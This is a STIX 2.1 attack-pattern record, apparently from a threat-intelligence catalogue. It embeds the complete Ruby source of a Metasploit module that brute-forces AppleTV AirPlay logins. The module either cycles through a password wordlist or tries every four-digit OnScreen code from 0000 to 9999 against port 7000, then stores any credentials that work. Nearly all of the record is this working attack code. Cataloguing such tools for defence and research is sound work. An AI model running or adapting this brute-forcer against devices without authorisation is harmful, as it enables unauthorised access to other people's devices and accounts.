{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a5f7fd8a-ac4e-41c1-a52b-23702547b896",
    "created": "2024-08-14T16:28:53.526321Z",
    "modified": "2024-08-14T16:28:53.526324Z",
    "name": "AppleTV AirPlay Login Utility",
    "description": "( This module attempts to authenticate to an AppleTV service with the username, 'AirPlay'.  The device has two different access control modes: OnScreen and Password. The difference between the two is the password in OnScreen mode is numeric-only and four digits long, which means when this option is enabled, this option, the module will make sure to cover all of them - from 0000 to 9999.  The Password mode is more complex, therefore the usual online bruteforce strategies apply. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/appletv_login.rb",
            "external_id": "appletv_login.rb"
        },
        {
            "source_name": "reference",
            "url": "http://nto.github.io/AirPlay.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/http'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n        'Name'           => 'AppleTV AirPlay Login Utility',\n        'Description'    => %q(\n        This module attempts to authenticate to an AppleTV service with\n        the username, 'AirPlay'.  The device has two different access control\n        modes: OnScreen and Password. The difference between the two is the\n        password in OnScreen mode is numeric-only and four digits long, which\n        means when this option is enabled, this option, the module will make\n        sure to cover all of them - from 0000 to 9999.  The Password mode is\n        more complex, therefore the usual online bruteforce strategies apply.\n      ),\n        'Author'         =>\n          [\n            '0a29406d9794e4f9b30b3c5d6702c708',  # Original\n            'thelightcosine'                     # LoginScanner conversion help\n          ],\n        'License'        => MSF_LICENSE,\n        'References'     =>\n          [\n            ['URL', 'http://nto.github.io/AirPlay.html']\n          ],\n        'DefaultOptions' => {\n            'RPORT'           => 7000,  # AppleTV's server\n            'STOP_ON_SUCCESS' => true   # There's only one password with the same username\n        }\n    )\n\n    register_options(\n        [\n            OptBool.new('Onscreen', [false, 'Enable if AppleTV is using the Onscreen access control', false]),\n            OptPath.new('PASS_FILE', [\n                false,\n                'File containing passwords, one per line',\n                File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')\n            ]\n            )])\n\n    deregister_options(\n        'USERNAME', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING',\n        'NTLM::SendLM', 'NTLM::SendNTLM', 'NTLM::SendSPN', 'NTLM::UseLMKey', 'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2',\n        'REMOVE_USERPASS_FILE', 'REMOVE_USER_FILE', 'DOMAIN', 'HttpUsername', 'PASSWORD_SPRAY'\n    )\n  end\n\n    def run_host(ip)\n    uri = \"/stop\"\n    if datastore['PASS_FILE'] && !datastore['PASS_FILE'].empty?\n      print_status(\"Attempting to login to #{uri} using password list\")\n      cred_collection = Metasploit::Framework::CredentialCollection.new(\n          blank_passwords: datastore['BLANK_PASSWORDS'],\n          pass_file: datastore['PASS_FILE'],\n          username: 'AirPlay',\n          user_as_pass: datastore['USER_AS_PASS'],\n      )\n      cred_collection = prepend_db_passwords(cred_collection)\n    else\n      print_status(\"Attempting to login to #{uri} by 'Onscreen Code'\")\n      cred_collection = LockCodeCollection.new\n    end\n\n    scanner = Metasploit::Framework::LoginScanner::HTTP.new(\n      configure_http_login_scanner(\n        uri: \"/stop\",\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5,\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id,\n          service_name: 'airplay'\n      )\n      case result.status\n        when Metasploit::Model::Login::Status::SUCCESSFUL\n          print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n          credential_core = create_credential(credential_data)\n          credential_data[:core] = credential_core\n          create_credential_login(credential_data)\n          :next_user\n        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n          print_brute :level => :verror, :ip => ip, :msg => \"Could not connect\"\n          invalidate_login(credential_data)\n          :abort\n        when Metasploit::Model::Login::Status::INCORRECT\n          print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n          invalidate_login(credential_data)\n        when Metasploit::Model::Login::Status::NO_AUTH_REQUIRED\n          print_brute :level => :error, :ip => ip, :msg => \"NO AUTH REQUIRED: '#{result.credential}'\"\n          break\n      end\n    end\n  end\n\n  # This class is just a faster way of doing our LockCode enumeration. We could just stick this into\n  # a CredentialCollection, but since we have a pre-set range we iterate through, it is easier to do it\n  # at runtime.\n  class LockCodeCollection\n\n    def each\n      (0..9999).each do |pass|\n        screen_code = Metasploit::Framework::Credential.new(public: 'AirPlay', private: pass.to_s.rjust(4, '0'), realm: nil, private_type: :password )\n        yield screen_code\n      end\n    end\n  end\nend\n\n"
}